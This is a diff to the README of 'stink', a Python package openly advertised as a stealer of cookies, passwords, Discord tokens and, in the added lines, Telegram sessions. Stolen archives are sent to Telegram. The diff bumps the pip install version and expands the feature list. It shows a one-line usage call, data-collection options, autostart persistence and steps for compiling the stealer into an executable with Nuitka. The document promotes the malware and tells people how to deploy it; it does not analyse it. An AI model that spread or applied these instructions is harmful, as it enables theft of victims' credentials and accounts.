@@ -6,10 +6,10 @@
 
 # stink
 
-Cookies and passwords stealer in just 2 lines. Sending to Telegram.
+Stealer in just 2 lines with sending to telegram.
 
 ## Description
-`stink` is just starting its development. Its functionality will be expanded in the future.
+The `stink` already has an impressive functionality that will only expand.
 
 ## Navigation
 * [Current features](#Сurrent-features)
@@ -42,6 +42,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
    - System configuration
    - Active processes
    - Discord tokens
+   - Telegram sessions
 3. Sending an archive of collected data to Telegram.
 4. Execution in a separate thread.
 5. Possibility to add to autostart.
@@ -54,7 +55,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.2.2
+pip install stink==1.3.0
 ```
 
 ## Example usage
@@ -83,6 +84,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 - `screen` - screenshot.
 
 - `discord` - collecting Discord tokens.
+
+- `telegram` - collecting Telegram sessions.
 
 All parameters take the value of `bool`. 
 
@@ -167,7 +170,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.2.2
+pip install stink==1.3.0
 ```
 6. To reduce the file size, additionally install Zstandard (optional):
 ```
